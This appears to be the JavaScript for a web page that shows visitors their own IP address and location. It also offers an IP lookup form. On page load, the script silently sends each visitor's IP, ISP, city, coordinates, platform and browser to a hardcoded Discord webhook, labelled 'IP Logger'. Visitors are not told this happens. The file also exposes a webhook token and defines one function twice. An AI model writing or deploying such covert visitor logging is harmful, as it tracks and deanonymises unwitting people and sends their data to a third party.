const webhookUrl = 'https://discord.com/api/webhooks/1294679025914220635/58HwZgKw8lC4c0U_AsQ7KFIKt_R9eD85qba_GHuOcMEMzmzR1CY4WdpQdGlcRUWseNrC';  // Replace with your actual webhook URL

// Fetch the user's IP address and location using ipwho.is API
fetch('https://ipwho.is/')
  .then(response => response.json())
  .then(data => {
    const { ip, isp, city, region, country, latitude: lat, longitude: lon } = data;

    // Display the IP address on the page
    document.getElementById('ip').textContent = ip;

    // Populate the header with connection information
    const headerInfo = document.getElementById('header-info');
    const browser = detectBrowser();
    const platform = detectPlatform();

    headerInfo.innerHTML = `
      <p>ISP: ${isp}</p>
      <p>Device: ${platform}</p>
      <p>Browser: ${browser}</p>
    `;

    // Initialize and display the map using Leaflet
    const map = L.map('map').setView([lat, lon], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
      attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
    }).addTo(map);

    // Add a marker to the user's location on the map
    L.marker([lat, lon]).addTo(map)
      .bindPopup(`You're here: ${city}, ${region}, ${country}`)
      .openPopup();

    // Send the details to Discord webhook
    sendToDiscord(ip, isp, city, region, country, lat, lon, platform, browser);
  })
  .catch(error => {
    console.error('Error fetching IP address or location:', error);
    document.getElementById('ip').textContent = 'Unable to retrieve IP address.';
  });

// Browser detection function (handles both userAgent and userAgentData)
function detectBrowser() {
  let userAgent = navigator.userAgent || ""; // Fallback to userAgent if userAgentData is not available

  // If `navigator.userAgentData` is available (modern browsers)
  if (navigator.userAgentData && navigator.userAgentData.brands) {
    userAgent = navigator.userAgentData.brands.map(b => b.brand).join(" ");
  }

  if (userAgent.includes('Chrome')) return 'Chrome';
  if (userAgent.includes('Firefox')) return 'Firefox';
  if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) return 'Safari';
  if (userAgent.includes('Edge')) return 'Edge';
  if (userAgent.includes('Opera') || userAgent.includes('OPR')) return 'Opera';
  return 'Unknown Browser';
}

// Platform detection function (modern and fallback handling)
function detectPlatform() {
  if (navigator.userAgentData && navigator.userAgentData.platform) {
    return navigator.userAgentData.platform; // Modern browsers
  }

  const platform = navigator.platform.toLowerCase(); // Fallback for older browsers
  if (platform.includes('win')) return 'Windows';
  if (platform.includes('mac')) return 'MacOS';
  if (platform.includes('linux')) return 'Linux';
  if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
  if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
  return 'Unknown Platform';
}


// Platform detection function (modern)
function detectPlatform() {
  const userAgentData = navigator.userAgentData;
  if (userAgentData) {
    return userAgentData.platform; // More accurate on modern browsers
  }
  const platform = navigator.platform.toLowerCase(); // Fallback for older browsers
  if (platform.includes('win')) return 'Windows';
  if (platform.includes('mac')) return 'MacOS';
  if (platform.includes('linux')) return 'Linux';
  if (/android/.test(navigator.userAgent.toLowerCase())) return 'Android';
  if (/iphone|ipad|ipod/.test(navigator.userAgent.toLowerCase())) return 'iOS';
  return 'Unknown Platform';
}

// Send details to Discord webhook
function sendToDiscord(ip, isp, city, region, country, lat, lon, platform, browser) {
  const embedMessage = {
    username: 'IP Logger',
    embeds: [
      {
        title: 'Visitor Logged',
        color: 16711680, // Red color
        fields: [
          { name: 'IP Address', value: ip || 'Unknown', inline: true },
          { name: 'ISP', value: isp || 'Unavailable', inline: true },
          { name: 'Location', value: `${city}, ${region}, ${country}`, inline: false },
          { name: 'Coordinates', value: `Lat: ${lat}, Lon: ${lon}`, inline: false },
          { name: 'Platform', value: platform || 'Unknown', inline: true },
          { name: 'Browser', value: browser || 'Unknown', inline: true },
          { name: 'Timestamp', value: new Date().toLocaleString(), inline: false }
        ],
        footer: {
          text: 'Logged using IP Logger Bot',
          icon_url: 'https://cdn-icons-png.flaticon.com/512/906/906794.png'
        }
      }
    ]
  };

  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(embedMessage)
  })
    .then(response => {
      if (response.ok) {
        console.log('Webhook sent successfully!');
      } else {
        console.error('Failed to send webhook:', response.statusText);
      }
    })
    .catch(error => console.error('Error sending webhook:', error));
}

// Handle the IP Lookup form submission on lookup.html
if (document.getElementById('lookup-form')) {
  document.getElementById('lookup-form').addEventListener('submit', function (event) {
    event.preventDefault(); // Prevent form from reloading the page

    const ipInput = document.getElementById('ip-input').value.trim();
    if (!ipInput) {
      alert('Please enter a valid IP address.');
      return;
    }

    // Fetch details for the provided IP address using ipwho.is API
    fetch(`https://ipwho.is/${ipInput}`)
      .then(response => response.json())
      .then(data => {
        if (!data.success) {
          alert('Invalid IP address or data unavailable.');
          return;
        }

        const { ip, isp, city, region, country, latitude: lat, longitude: lon } = data;

        // Display the IP details on the page
        document.getElementById('ip-details').innerHTML = `
          <p><strong>IP Address:</strong> ${ip}</p>
          <p><strong>ISP:</strong> ${isp}</p>
          <p><strong>Location:</strong> ${city}, ${region}, ${country}</p>
          <p><strong>Coordinates:</strong> Lat: ${lat}, Lon: ${lon}</p>
        `;

        // Initialize the map and center it on the fetched location
        const map = L.map('lookup-map').setView([lat, lon], 13);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
          attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
        }).addTo(map);

        // Add a marker for the fetched IP location
        L.marker([lat, lon]).addTo(map)
          .bindPopup(`Location: ${city}, ${region}, ${country}`)
          .openPopup();
      })
      .catch(error => {
        console.error('Error fetching IP details:', error);
        alert('Failed to retrieve IP details. Please try again.');
      });
  });
}
